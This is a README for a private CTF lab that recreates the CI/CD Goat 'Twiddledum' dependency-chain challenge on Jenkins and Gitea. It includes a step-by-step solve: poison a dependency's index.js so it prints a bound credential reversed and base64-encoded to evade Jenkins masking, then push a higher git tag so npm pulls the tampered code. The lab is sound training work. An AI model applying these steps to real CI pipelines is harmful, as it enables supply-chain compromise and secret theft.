# Twiddledum: dependency chain abuse (CyberCTF lab)

A bespoke, self-contained reproduction of the **Twiddledum** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-3, Dependency
Chain Abuse**. Wonderland runs CI on a **Jenkins** controller that builds the `Wonderland/twiddledum`
repository (hosted on a **Gitea** server). `twiddledum` is a small Node app that depends on
`Wonderland/twiddledee`, pinned in its `package.json` by a **mutable git-tag version range**
(`git+http://gitea:3000/Wonderland/twiddledee#semver:^1.1.0`). An attacker with write access to the
*dependency* poisons its `index.js` and pushes a **higher tag** (`1.2.0`); npm resolves the higher
tag, so the dependency's code runs inside the twiddledum build and exfiltrates Wonderland's release
token, which the pipeline binds from the Jenkins credential store as `FLAG6`.

**Private lab content — do not copy into any public repository.**

## Infrastructure

Two machines, the minimum a dependency-chain attack on a live pipeline needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. A Job DSL seed creates the `wonderland-twiddledum` multibranch pipeline (git-backed, branch discovery, rescanned every minute). `flag6` is a **GLOBAL-scope** string credential the pipeline binds into `FLAG6`; builds run on the controller's own executor, which has `node` + `npm` (and `git` + `curl` for the solver). |
| `gitea` | Gitea git host. The setup job provisions the `Wonderland` org, the attacker `alice` (write on **twiddledee**), and the two **public** repos, pushing `twiddledee` with an initial `1.1.0` tag and `twiddledum` with its `Jenkinsfile`. |

No GitLab, CTFd, prod box or SSH agents — only what this one vulnerability needs. The web ports
listen on container `8080` (Jenkins) and `3000` (Gitea); the host ports are assigned dynamically by
the runner (see below). Jenkins is slow to boot and each build resolves + clones a git dependency —
allow a few minutes.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `twiddledum` | `SECRET` (`%s`) | Wonderland's `flag6` release token, exfiltrated from the Jenkins credential store through the poisoned `twiddledee` dependency |

Intended path: clone `Wonderland/twiddledee` with the attacker's write creds → edit its `index.js` to
read `process.env.FLAG6` and print `base64(reverse(FLAG6))` (reverse first: modern Jenkins masks the
raw value *and* its plain base64) → commit and push a **higher git tag** (`1.2.0`) so twiddledum's
`#semver:^1.1.0` range resolves to your commit → trigger the twiddledum pipeline → read the build
console, base64-decode and reverse the blob. The recovered token is the flag. Note the pipeline
installs with `npm install --ignore-scripts`, so an npm lifecycle-script payload is a dead end — the
payload must live in the dependency's module code (`index.js`), which `node index.js` executes via
`require('twiddledee')`.

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_TWIDDLEDUM]`, delivered via
`files: [{ path: /run/lab/secrets/flag6, input: CTF_FLAG_TWIDDLEDUM }]` on the Jenkins machine),
never an environment variable, so it never appears in `docker inspect`, an image layer or a
generated file. The Jenkins entrypoint stages the file into the directory JCasC reads file secrets
from, so `flag6` (`secret: "${flag6}"`) resolves at boot **into the credential store only** — a
pipeline must bind the credential to read it, exactly as in the challenge.

An **offline start** (local, CI) leaves the input empty, and the lab stages its development
placeholder (`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a
launcher.

## Dynamic ports

Both web services declare `ports: { web: { port: <n>, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback / service DNS and the lab network CIDR). The `message` reads the real URLs back through
`{{ machines.jenkins.ports.web.url }}` and `{{ machines.gitea.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_TWIDDLEDUM for a real value
isothrum check . --target docker       # Jenkins is slow; the solver waits for the build
isothrum down . --target docker
```

Solve it the way the check does:

```bash
git clone http://alice:alice@<gitea-url>/Wonderland/twiddledee.git
cd twiddledee
# edit index.js: console.log(Buffer.from((process.env.FLAG6||'').split('').reverse().join('')).toString('base64'))
git commit -am poison && git tag 1.2.0 && git push origin main && git push origin 1.2.0
# trigger the twiddledum pipeline in Jenkins, then read the build console:
#   the blob there, base64-decoded and reversed, is the flag
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins + node/npm, runs as root to read the mounted secret
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: the GLOBAL-scope `flag6` credential, security, the Job DSL seed
- `build/jenkins/casc/jobdsl/twiddledum.groovy` — the multibranch pipeline (git branch discovery + 1-minute rescan)
- `build/jenkins/entrypoint.sh` — stages the per-player flag into the JCasC file-secret directory
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/tw-solve`): performs the dependency-chain attack end to end and proves the flag was exfiltrated, never printing it
- `build/gitea/Dockerfile`, `app.ini`, `entrypoint.sh` — the installed Gitea host
- `build/gitea/seed.sh` — the `setup` step: provisions the org/attacker and pushes both repos (twiddledee tagged `1.1.0`)
- `build/gitea/repo-src/twiddledum/` — the consuming app + its `Jenkinsfile` and the mutable-ref dependency pin
- `build/gitea/repo-src/twiddledee/` — the original dependency the attacker controls
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the faithful deviations
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
